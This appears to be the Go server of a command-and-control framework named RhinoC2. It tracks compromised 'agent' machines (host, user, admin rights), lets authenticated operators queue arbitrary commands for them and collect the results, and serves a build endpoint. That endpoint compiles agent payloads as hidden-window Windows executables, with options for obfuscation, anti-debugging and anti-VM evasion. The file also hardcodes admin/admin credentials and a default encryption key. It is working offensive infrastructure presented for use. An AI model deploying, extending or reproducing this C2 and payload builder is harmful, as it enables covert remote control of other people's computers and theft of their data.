package main

import (
	"context"
	"crypto/rand"
	"encoding/hex"
	"encoding/json"
	"flag"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"rhinoc2/pkg/crypto"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/gorilla/mux"
	"github.com/gorilla/websocket"
	"golang.org/x/crypto/bcrypt"
)

type Agent struct {
	ID          string
	Hostname    string
	Username    string
	OS          string
	Arch        string
	IP          string
	LastSeen    time.Time
	FirstSeen   time.Time
	Conn        *websocket.Conn
	TaskQueue   []Task
	TaskHistory []Task
	mu          sync.Mutex
	SysInfo     map[string]string
	IsAdmin     bool
	Integrity   string
	PID         int
	PPID        int
	IsDemo      bool
}

type Task struct {
	ID        string
	Command   string
	Args      string
	Status    string
	Result    string
	Timestamp time.Time
	Completed time.Time
}

type Message struct {
	Type    string      `json:"type"`
	AgentID string      `json:"agent_id,omitempty"`
	Data    interface{} `json:"data"`
}

type Session struct {
	ID        string
	Username  string
	CreatedAt time.Time
	ExpiresAt time.Time
}

type Server struct {
	agents         map[string]*Agent
	mu             sync.RWMutex
	upgrader       websocket.Upgrader
	crypto         *crypto.CryptoHandler
	operators      map[*websocket.Conn]bool
	opMu           sync.RWMutex
	taskLog        []Task
	logMu          sync.RWMutex
	sessions       map[string]*Session
	sessMu         sync.RWMutex
	users          map[string]string
	csrfTokens     map[string]time.Time
	csrfMu         sync.RWMutex
	loginAttempts  map[string][]time.Time
	attemptsMu     sync.RWMutex
	shutdownCtx    context.Context
	shutdownCancel context.CancelFunc
}

func NewServer(key string) *Server {
	ctx, cancel := context.WithCancel(context.Background())
	s := &Server{
		agents: make(map[string]*Agent),
		upgrader: websocket.Upgrader{
			CheckOrigin: func(r *http.Request) bool {
				origin := r.Header.Get("Origin")
				if origin == "" {
					return false
				}
				allowed := []string{"http://localhost", "https://localhost"}
				for _, a := range allowed {
					if strings.HasPrefix(origin, a) {
						return true
					}
				}
				return false
			},
		},
		crypto:         crypto.NewCryptoHandler(key),
		operators:      make(map[*websocket.Conn]bool),
		taskLog:        make([]Task, 0, 1000),
		sessions:       make(map[string]*Session),
		users:          make(map[string]string),
		csrfTokens:     make(map[string]time.Time),
		loginAttempts:  make(map[string][]time.Time),
		shutdownCtx:    ctx,
		shutdownCancel: cancel,
	}

	s.initializeUsers()
	s.startSessionCleanup()
	s.startCSRFCleanup()
	return s
}

func (s *Server) initializeUsers() {
	hash, _ := bcrypt.GenerateFromPassword([]byte("admin"), bcrypt.DefaultCost)
	s.users["admin"] = string(hash)
	log.Println("WARNING: Default credentials active: admin/admin - CHANGE IMMEDIATELY!")
	log.Println("Security Notice: Change default password via environment variable or config file")
}

func (s *Server) startSessionCleanup() {
	go func() {
		ticker := time.NewTicker(5 * time.Minute)
		defer ticker.Stop()
		for {
			select {
			case <-ticker.C:
				s.sessMu.Lock()
				now := time.Now()
				for id, session := range s.sessions {
					if now.After(session.ExpiresAt) {
						delete(s.sessions, id)
					}
				}
				s.sessMu.Unlock()
			case <-s.shutdownCtx.Done():
				return
			}
		}
	}()
}

func (s *Server) startCSRFCleanup() {
	go func() {
		ticker := time.NewTicker(10 * time.Minute)
		defer ticker.Stop()
		for {
			select {
			case <-ticker.C:
				s.csrfMu.Lock()
				now := time.Now()
				for token, expiry := range s.csrfTokens {
					if now.After(expiry) {
						delete(s.csrfTokens, token)
					}
				}
				s.csrfMu.Unlock()
			case <-s.shutdownCtx.Done():
				return
			}
		}
	}()
}

func (s *Server) handleAgent(w http.ResponseWriter, r *http.Request) {
	defer func() {
		if rec := recover(); rec != nil {
			log.Printf("Panic in handleAgent: %v", rec)
		}
	}()

	conn, err := s.upgrader.Upgrade(w, r, nil)
	if err != nil {
		log.Printf("agent upgrade failed: %v", err)
		return
	}

	var agent *Agent
	defer func() {
		if rec := recover(); rec != nil {
			log.Printf("Panic in agent handler cleanup: %v", rec)
		}
		conn.Close()
		if agent != nil {
			s.mu.Lock()
			delete(s.agents, agent.ID)
			s.mu.Unlock()
			s.broadcastToOperators(Message{
				Type:    "agent_disconnected",
				AgentID: agent.ID,
			})
			log.Printf("agent disconnected: %s", agent.ID)
		}
	}()

	_, msg, err := conn.ReadMessage()
	if err != nil {
		log.Printf("read initial msg failed: %v", err)
		return
	}

	var checkin map[string]interface{}
	decrypted := msg

	if err := json.Unmarshal(msg, &checkin); err != nil {
		decryptedStr, err := s.crypto.Decrypt(string(msg))
		if err != nil {
			log.Printf("decrypt failed: %v", err)
			return
		}
		decrypted = decryptedStr

		if err := json.Unmarshal(decrypted, &checkin); err != nil {
			log.Printf("unmarshal failed: %v", err)
			return
		}
	}

	id, ok := checkin["id"].(string)
	if !ok || len(id) == 0 || len(id) > 64 {
		log.Printf("invalid agent ID")
		return
	}
	hostname, ok := checkin["hostname"].(string)
	if !ok || len(hostname) == 0 || len(hostname) > 256 {
		log.Printf("invalid hostname")
		return
	}
	username, ok := checkin["username"].(string)
	if !ok || len(username) == 0 || len(username) > 256 {
		log.Printf("invalid username")
		return
	}
	osName, ok := checkin["os"].(string)
	if !ok || len(osName) == 0 || len(osName) > 64 {
		log.Printf("invalid os")
		return
	}

	agent = &Agent{
		ID:        id,
		Hostname:  hostname,
		Username:  username,
		OS:        osName,
		IP:        r.RemoteAddr,
		LastSeen:  time.Now(),
		FirstSeen: time.Now(),
		Conn:      conn,
	}

	if arch, ok := checkin["arch"].(string); ok {
		agent.Arch = arch
	}

	if isAdmin, ok := checkin["is_admin"].(bool); ok {
		agent.IsAdmin = isAdmin
	}

	if isDemo, ok := checkin["is_demo"].(bool); ok {
		agent.IsDemo = isDemo
	}

	if integrity, ok := checkin["integrity"].(string); ok {
		agent.Integrity = integrity
	}

	if pid, ok := checkin["pid"].(float64); ok {
		agent.PID = int(pid)
	}

	if ppid, ok := checkin["ppid"].(float64); ok {
		agent.PPID = int(ppid)
	}

	if sysinfo, ok := checkin["sysinfo"].(map[string]interface{}); ok {
		agent.SysInfo = make(map[string]string)
		for k, v := range sysinfo {
			if str, ok := v.(string); ok {
				agent.SysInfo[k] = str
			}
		}
	}

	s.mu.Lock()
	s.agents[agent.ID] = agent
	s.mu.Unlock()

	log.Printf("agent connected: %s (%s@%s) [%s/%s]",
		agent.ID[:16], agent.Username, agent.Hostname, agent.OS, agent.Arch)

	s.broadcastToOperators(Message{
		Type:    "agent_connected",
		AgentID: agent.ID,
		Data:    agent.info(),
	})

	for {
		_, msg, err := conn.ReadMessage()
		if err != nil {
			break
		}

		// try plain JSON first (for demo agents)
		var response map[string]interface{}
		decrypted := msg

		if err := json.Unmarshal(msg, &response); err != nil {
			// not plain JSON, try decrypting
			decryptedStr, err := s.crypto.Decrypt(string(msg))
			if err != nil {
				continue
			}
			decrypted = decryptedStr

			if err := json.Unmarshal(decrypted, &response); err != nil {
				continue
			}
		}

		agent.mu.Lock()
		agent.LastSeen = time.Now()

		if taskID, ok := response["task_id"].(string); ok {
			for i, task := range agent.TaskQueue {
				if task.ID == taskID {
					agent.TaskQueue[i].Status = "completed"
					agent.TaskQueue[i].Completed = time.Now()
					if result, ok := response["result"].(string); ok {
						if len(result) > 1048576 {
							agent.TaskQueue[i].Result = result[:1048576] + "... (truncated)"
						} else {
							agent.TaskQueue[i].Result = result
						}
					}

					completedTask := agent.TaskQueue[i]

					const maxHistory = 1000
					if len(agent.TaskHistory) >= maxHistory {
						agent.TaskHistory = agent.TaskHistory[1:]
					}
					agent.TaskHistory = append(agent.TaskHistory, completedTask)

					s.logMu.Lock()
					if len(s.taskLog) >= maxHistory {
						s.taskLog = s.taskLog[1:]
					}
					s.taskLog = append(s.taskLog, completedTask)
					s.logMu.Unlock()

					s.broadcastToOperators(Message{
						Type:    "task_result",
						AgentID: agent.ID,
						Data:    completedTask,
					})

					agent.TaskQueue = append(agent.TaskQueue[:i], agent.TaskQueue[i+1:]...)
					break
				}
			}
		}

		if len(agent.TaskQueue) > 0 {
			for i, task := range agent.TaskQueue {
				if task.Status == "pending" {
					taskData, _ := json.Marshal(task)
					if agent.IsDemo {
						conn.WriteMessage(websocket.TextMessage, taskData)
					} else {
						encrypted, _ := s.crypto.Encrypt(taskData)
						conn.WriteMessage(websocket.TextMessage, []byte(encrypted))
					}
					agent.TaskQueue[i].Status = "sent"
					break
				}
			}
		}
		agent.mu.Unlock()
	}
}

func (s *Server) handleOperator(w http.ResponseWriter, r *http.Request) {
	defer func() {
		if rec := recover(); rec != nil {
			log.Printf("Panic in handleOperator: %v", rec)
		}
	}()

	conn, err := s.upgrader.Upgrade(w, r, nil)
	if err != nil {
		log.Printf("operator upgrade failed: %v", err)
		return
	}

	s.opMu.Lock()
	s.operators[conn] = true
	s.opMu.Unlock()

	defer func() {
		if rec := recover(); rec != nil {
			log.Printf("Panic in operator cleanup: %v", rec)
		}
		s.opMu.Lock()
		delete(s.operators, conn)
		s.opMu.Unlock()
		conn.Close()
	}()

	s.sendAgentList(conn)

	for {
		_, msg, err := conn.ReadMessage()
		if err != nil {
			break
		}

		var cmd Message
		if err := json.Unmarshal(msg, &cmd); err != nil {
			continue
		}

		switch cmd.Type {
		case "list_agents":
			s.sendAgentList(conn)

		case "execute":
			if data, ok := cmd.Data.(map[string]interface{}); ok {
				agentID := data["agent_id"].(string)
				command := data["command"].(string)
				args := ""
				if a, ok := data["args"].(string); ok {
					args = a
				}

				s.mu.RLock()
				agent, exists := s.agents[agentID]
				s.mu.RUnlock()

				if exists {
					agent.mu.Lock()
					task := Task{
						ID:        fmt.Sprintf("%d", time.Now().UnixNano()),
						Command:   command,
						Args:      args,
						Status:    "pending",
						Timestamp: time.Now(),
					}
					agent.TaskQueue = append(agent.TaskQueue, task)
					agent.mu.Unlock()

					response, _ := json.Marshal(Message{
						Type:    "task_queued",
						AgentID: agentID,
						Data:    task,
					})
					conn.WriteMessage(websocket.TextMessage, response)
				}
			}

		case "get_agent_info":
			if data, ok := cmd.Data.(map[string]interface{}); ok {
				agentID := data["agent_id"].(string)
				s.mu.RLock()
				agent, exists := s.agents[agentID]
				s.mu.RUnlock()

				if exists {
					response, _ := json.Marshal(Message{
						Type:    "agent_info",
						AgentID: agentID,
						Data:    agent.detailedInfo(),
					})
					conn.WriteMessage(websocket.TextMessage, response)
				}
			}

		case "get_task_history":
			if data, ok := cmd.Data.(map[string]interface{}); ok {
				agentID := data["agent_id"].(string)
				s.mu.RLock()
				agent, exists := s.agents[agentID]
				s.mu.RUnlock()

				if exists {
					agent.mu.Lock()
					history := agent.TaskHistory
					agent.mu.Unlock()

					response, _ := json.Marshal(Message{
						Type:    "task_history",
						AgentID: agentID,
						Data:    history,
					})
					conn.WriteMessage(websocket.TextMessage, response)
				}
			}
		}
	}
}

func (s *Server) sendAgentList(conn *websocket.Conn) {
	s.mu.RLock()
	agentList := make([]map[string]interface{}, 0)
	for _, agent := range s.agents {
		agentList = append(agentList, agent.info())
	}
	s.mu.RUnlock()

	msg, _ := json.Marshal(Message{
		Type: "agent_list",
		Data: agentList,
	})
	conn.WriteMessage(websocket.TextMessage, msg)
}

func (s *Server) broadcastToOperators(msg Message) {
	data, _ := json.Marshal(msg)
	s.opMu.RLock()
	defer s.opMu.RUnlock()

	for conn := range s.operators {
		conn.WriteMessage(websocket.TextMessage, data)
	}
}

func (a *Agent) info() map[string]interface{} {
	a.mu.Lock()
	defer a.mu.Unlock()
	return map[string]interface{}{
		"id":         a.ID,
		"hostname":   a.Hostname,
		"username":   a.Username,
		"os":         a.OS,
		"arch":       a.Arch,
		"ip":         a.IP,
		"last_seen":  a.LastSeen.Format(time.RFC3339),
		"first_seen": a.FirstSeen.Format(time.RFC3339),
		"is_admin":   a.IsAdmin,
		"integrity":  a.Integrity,
		"pid":        a.PID,
		"ppid":       a.PPID,
	}
}

func (a *Agent) detailedInfo() map[string]interface{} {
	a.mu.Lock()
	defer a.mu.Unlock()
	return map[string]interface{}{
		"id":            a.ID,
		"hostname":      a.Hostname,
		"username":      a.Username,
		"os":            a.OS,
		"arch":          a.Arch,
		"ip":            a.IP,
		"last_seen":     a.LastSeen.Format(time.RFC3339),
		"first_seen":    a.FirstSeen.Format(time.RFC3339),
		"sysinfo":       a.SysInfo,
		"task_count":    len(a.TaskHistory),
		"pending_tasks": len(a.TaskQueue),
		"is_admin":      a.IsAdmin,
		"integrity":     a.Integrity,
		"pid":           a.PID,
		"ppid":          a.PPID,
	}
}

func (s *Server) handleRESTAPI(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")

	s.mu.RLock()
	agents := make([]map[string]interface{}, 0)
	for _, agent := range s.agents {
		agents = append(agents, agent.info())
	}
	s.mu.RUnlock()

	json.NewEncoder(w).Encode(map[string]interface{}{
		"agents": agents,
		"count":  len(agents),
	})
}

func (s *Server) serveStatic(w http.ResponseWriter, r *http.Request) {
	path := r.URL.Path
	var filePath string

	if path == "/" || path == "/panel.html" {
		if _, err := os.Stat("../client/panel.html"); err == nil {
			filePath = "../client/panel.html"
		} else {
			filePath = "client/panel.html"
		}
	} else if path == "/index.html" {
		if _, err := os.Stat("../client/index.html"); err == nil {
			filePath = "../client/index.html"
		} else {
			filePath = "client/index.html"
		}
	} else {
		if _, err := os.Stat("../client/panel.html"); err == nil {
			filePath = "../client/panel.html"
		} else {
			filePath = "client/panel.html"
		}
	}

	http.ServeFile(w, r, filePath)
}

func (s *Server) serveLogin(w http.ResponseWriter, r *http.Request) {
	var filePath string
	if _, err := os.Stat("../client/login.html"); err == nil {
		filePath = "../client/login.html"
	} else {
		filePath = "client/login.html"
	}
	http.ServeFile(w, r, filePath)
}

func (s *Server) handleLogin(w http.ResponseWriter, r *http.Request) {
	clientIP := strings.Split(r.RemoteAddr, ":")[0]

	s.attemptsMu.Lock()
	attempts := s.loginAttempts[clientIP]
	now := time.Now()
	var recentAttempts []time.Time
	for _, t := range attempts {
		if now.Sub(t) < 15*time.Minute {
			recentAttempts = append(recentAttempts, t)
		}
	}
	if len(recentAttempts) >= 5 {
		s.attemptsMu.Unlock()
		log.Printf("Rate limit exceeded for IP: %s", clientIP)
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusTooManyRequests)
		json.NewEncoder(w).Encode(map[string]string{"error": "Too many login attempts. Try again later."})
		return
	}
	s.loginAttempts[clientIP] = append(recentAttempts, now)
	s.attemptsMu.Unlock()

	var creds struct {
		Username string `json:"username"`
		Password string `json:"password"`
	}

	if err := json.NewDecoder(r.Body).Decode(&creds); err != nil {
		http.Error(w, "Invalid request", http.StatusBadRequest)
		return
	}

	if len(creds.Username) > 256 || len(creds.Password) > 256 {
		http.Error(w, "Invalid credentials", http.StatusBadRequest)
		return
	}

	s.sessMu.RLock()
	storedHash, exists := s.users[creds.Username]
	s.sessMu.RUnlock()

	if !exists {
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusUnauthorized)
		json.NewEncoder(w).Encode(map[string]string{"error": "Invalid credentials"})
		return
	}

	err := bcrypt.CompareHashAndPassword([]byte(storedHash), []byte(creds.Password))
	if err != nil {
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusUnauthorized)
		json.NewEncoder(w).Encode(map[string]string{"error": "Invalid credentials"})
		return
	}

	sessionID, err := generateSecureSessionID()
	if err != nil {
		http.Error(w, "Internal server error", http.StatusInternalServerError)
		return
	}

	session := &Session{
		ID:        sessionID,
		Username:  creds.Username,
		CreatedAt: time.Now(),
		ExpiresAt: time.Now().Add(2 * time.Hour),
	}

	s.sessMu.Lock()
	s.sessions[sessionID] = session
	s.sessMu.Unlock()

	http.SetCookie(w, &http.Cookie{
		Name:     "session_id",
		Value:    sessionID,
		Path:     "/",
		Expires:  session.ExpiresAt,
		HttpOnly: true,
		Secure:   true,
		SameSite: http.SameSiteStrictMode,
	})

	csrfToken, _ := generateSecureSessionID()
	s.csrfMu.Lock()
	s.csrfTokens[csrfToken] = time.Now().Add(1 * time.Hour)
	s.csrfMu.Unlock()

	log.Printf("User %s logged in from %s", creds.Username, clientIP)
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]string{
		"status":     "success",
		"csrf_token": csrfToken,
	})
}

func (s *Server) handleLogout(w http.ResponseWriter, r *http.Request) {
	cookie, err := r.Cookie("session_id")
	if err == nil {
		s.sessMu.Lock()
		if session, exists := s.sessions[cookie.Value]; exists {
			log.Printf("User %s logged out", session.Username)
			delete(s.sessions, cookie.Value)
		}
		s.sessMu.Unlock()
	}

	http.SetCookie(w, &http.Cookie{
		Name:     "session_id",
		Value:    "",
		Path:     "/",
		MaxAge:   -1,
		HttpOnly: true,
	})

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]string{"status": "logged out"})
}

func (s *Server) requireAuth(next http.HandlerFunc) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		defer func() {
			if rec := recover(); rec != nil {
				log.Printf("Panic in requireAuth: %v", rec)
				http.Error(w, "Internal server error", http.StatusInternalServerError)
			}
		}()

		cookie, err := r.Cookie("session_id")
		if err != nil {
			log.Printf("No session cookie from %s", r.RemoteAddr)
			if strings.Contains(r.Header.Get("Accept"), "application/json") {
				w.Header().Set("Content-Type", "application/json")
				w.WriteHeader(http.StatusUnauthorized)
				json.NewEncoder(w).Encode(map[string]string{"error": "Unauthorized"})
			} else {
				http.Redirect(w, r, "/login", http.StatusSeeOther)
			}
			return
		}

		s.sessMu.RLock()
		session, exists := s.sessions[cookie.Value]
		s.sessMu.RUnlock()

		if !exists || time.Now().After(session.ExpiresAt) {
			log.Printf("Invalid or expired session from %s", r.RemoteAddr)
			if exists {
				s.sessMu.Lock()
				delete(s.sessions, cookie.Value)
				s.sessMu.Unlock()
			}

			if strings.Contains(r.Header.Get("Accept"), "application/json") {
				w.Header().Set("Content-Type", "application/json")
				w.WriteHeader(http.StatusUnauthorized)
				json.NewEncoder(w).Encode(map[string]string{"error": "Session expired"})
			} else {
				http.Redirect(w, r, "/login", http.StatusSeeOther)
			}
			return
		}

		log.Printf("Auth OK for user %s", session.Username)
		next(w, r)
	}
}

func generateSecureSessionID() (string, error) {
	b := make([]byte, 64)
	_, err := rand.Read(b)
	if err != nil {
		return "", err
	}
	return hex.EncodeToString(b), nil
}

func (s *Server) handleBuild(w http.ResponseWriter, r *http.Request) {
	if r.Method != "POST" {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}

	var buildReq struct {
		C2Address string `json:"c2_address"`
		OS        string `json:"os"`
		Arch      string `json:"arch"`
		Format    string `json:"format"`
		Obfuscate bool   `json:"obfuscate"`
		AntiDebug bool   `json:"anti_debug"`
		AntiVM    bool   `json:"anti_vm"`
	}

	if err := json.NewDecoder(r.Body).Decode(&buildReq); err != nil {
		http.Error(w, "Invalid request", http.StatusBadRequest)
		return
	}

	if buildReq.C2Address == "" {
		buildReq.C2Address = "ws://localhost:8443/api/agent"
	}
	if buildReq.OS == "" {
		buildReq.OS = "windows"
	}
	if buildReq.Arch == "" {
		buildReq.Arch = "amd64"
	}
	if buildReq.Format == "" {
		buildReq.Format = "exe"
	}

	log.Printf("Building payload: %s/%s (%s) for %s", buildReq.OS, buildReq.Arch, buildReq.Format, buildReq.C2Address)

	payload, filename, err := s.buildPayload(buildReq.C2Address, buildReq.OS, buildReq.Arch, buildReq.Format, buildReq.Obfuscate, buildReq.AntiDebug, buildReq.AntiVM)
	if err != nil {
		log.Printf("Build failed: %v", err)
		http.Error(w, fmt.Sprintf("Build failed: %v", err), http.StatusInternalServerError)
		return
	}

	w.Header().Set("Content-Type", "application/octet-stream")
	w.Header().Set("Content-Disposition", fmt.Sprintf("attachment; filename=%s", filename))
	w.Header().Set("Content-Length", fmt.Sprintf("%d", len(payload)))
	w.Write(payload)

	log.Printf("Payload built successfully: %s (%d bytes)", filename, len(payload))
}

func (s *Server) buildPayload(c2Address, goos, goarch, format string, obfuscate, antiDebug, antiVM bool) ([]byte, string, error) {
	_ = rand.Reader
	_ = hex.EncodeToString

	// Use the real agent with all functionality
	agentDir, err := filepath.Abs("agent")
	if err != nil {
		return nil, "", fmt.Errorf("failed to get agent path: %v", err)
	}

	agentFile := filepath.Join(agentDir, "agent.go")
	if _, err := os.Stat(agentFile); os.IsNotExist(err) {
		return nil, "", fmt.Errorf("agent.go not found at %s", agentFile)
	}

	ext := ""
	if goos == "windows" {
		ext = ".exe"
	}
	outputName := fmt.Sprintf("agent_%s_%s%s", goos, goarch, ext)

	tmpDir, err := ioutil.TempDir("", "rhinoc2-build-*")
	if err != nil {
		return nil, "", fmt.Errorf("failed to create temp dir: %v", err)
	}
	defer os.RemoveAll(tmpDir)

	outputPath := filepath.Join(tmpDir, outputName)

	buildFlags := []string{"build"}
	if obfuscate {
		buildFlags = append(buildFlags, "-ldflags", "-s -w -H=windowsgui")
	} else {
		buildFlags = append(buildFlags, "-ldflags", "-H=windowsgui")
	}
	buildFlags = append(buildFlags, "-o", outputPath, agentFile)

	cmd := exec.Command("go", buildFlags...)
	cmd.Env = append(os.Environ(), "GOOS="+goos, "GOARCH="+goarch, "CGO_ENABLED=0")

	output, err := cmd.CombinedOutput()
	if err != nil {
		return nil, "", fmt.Errorf("build failed: %v\n%s", err, string(output))
	}

	payload, err := ioutil.ReadFile(outputPath)
	if err != nil {
		return nil, "", fmt.Errorf("failed to read payload: %v", err)
	}

	if format == "shellcode" {
		return nil, "", fmt.Errorf("shellcode format not yet implemented")
	} else if format == "dll" {
		return nil, "", fmt.Errorf("dll format not yet implemented")
	}

	return payload, outputName, nil
}

type ServerConfig struct {
	Port string
	Key  string
	Host string
}

func loadServerConfig() ServerConfig {
	var port, key, host, configFile string
	var showHelp bool

	flag.StringVar(&port, "port", "8443", "Server port")
	flag.StringVar(&host, "host", "0.0.0.0", "Server host address")
	flag.StringVar(&key, "key", "", "Encryption key")
	flag.StringVar(&configFile, "config", "", "Path to config file")
	flag.BoolVar(&showHelp, "help", false, "Show help")

	flag.Parse()

	if showHelp {
		fmt.Println("RhinoC2 Server Configuration Options")
		fmt.Println("Priority: 1) Command-line flags, 2) Environment variables, 3) Config file, 4) Defaults")
		fmt.Println("\nCommand-line flags:")
		flag.PrintDefaults()
		fmt.Println("\nEnvironment variables:")
		fmt.Println("  RHINO_PORT - Server port (default: 8443)")
		fmt.Println("  RHINO_HOST - Server host address (default: 0.0.0.0)")
		fmt.Println("  RHINO_KEY  - Encryption key")
		fmt.Println("\nConfig file format (JSON):")
		fmt.Println(`  {
    "port": "8443",
    "host": "0.0.0.0",
    "key": "YourSecretKey"
  }`)
		os.Exit(0)
	}

	config := ServerConfig{
		Port: "8443",
		Host: "0.0.0.0",
		Key:  "RhinoC2SecretKey2024",
	}

	if configFile != "" {
		data, err := ioutil.ReadFile(configFile)
		if err == nil {
			var fileConfig map[string]interface{}
			if json.Unmarshal(data, &fileConfig) == nil {
				if p, ok := fileConfig["port"].(string); ok {
					config.Port = p
				} else if pf, ok := fileConfig["port"].(float64); ok {
					config.Port = strconv.Itoa(int(pf))
				}
				if h, ok := fileConfig["host"].(string); ok {
					config.Host = h
				}
				if k, ok := fileConfig["key"].(string); ok {
					config.Key = k
				}
			}
		}
	}

	if envPort := os.Getenv("RHINO_PORT"); envPort != "" {
		config.Port = envPort
	}
	if envHost := os.Getenv("RHINO_HOST"); envHost != "" {
		config.Host = envHost
	}
	if envKey := os.Getenv("RHINO_KEY"); envKey != "" {
		config.Key = envKey
	}

	if port != "8443" {
		config.Port = port
	}
	if host != "0.0.0.0" {
		config.Host = host
	}
	if key != "" {
		config.Key = key
	}

	return config
}

func main() {
	config := loadServerConfig()
	srv := NewServer(config.Key)

	r := mux.NewRouter()

	r.HandleFunc("/login", srv.serveLogin)
	r.HandleFunc("/api/login", srv.handleLogin).Methods("POST")
	r.HandleFunc("/api/logout", srv.handleLogout).Methods("POST")

	r.HandleFunc("/api/agent", srv.handleAgent)

	r.HandleFunc("/api/operator", srv.requireAuth(srv.handleOperator))
	r.HandleFunc("/api/agents", srv.requireAuth(srv.handleRESTAPI)).Methods("GET")
	r.HandleFunc("/api/build", srv.requireAuth(srv.handleBuild)).Methods("POST")
	r.HandleFunc("/panel.html", srv.requireAuth(srv.serveStatic))
	r.HandleFunc("/index.html", srv.requireAuth(srv.serveStatic))
	r.HandleFunc("/", srv.requireAuth(srv.serveStatic))

	addr := config.Host + ":" + config.Port
	log.Printf("RhinoC2 server starting on %s", addr)
	log.Printf("Login page: http://localhost:%s/login", config.Port)
	log.Printf("Web interface: http://localhost:%s", config.Port)
	log.Printf("REST API: http://localhost:%s/api/agents", config.Port)
	log.Printf("Encryption key: %s", config.Key)
	log.Fatal(http.ListenAndServe(addr, r))
}
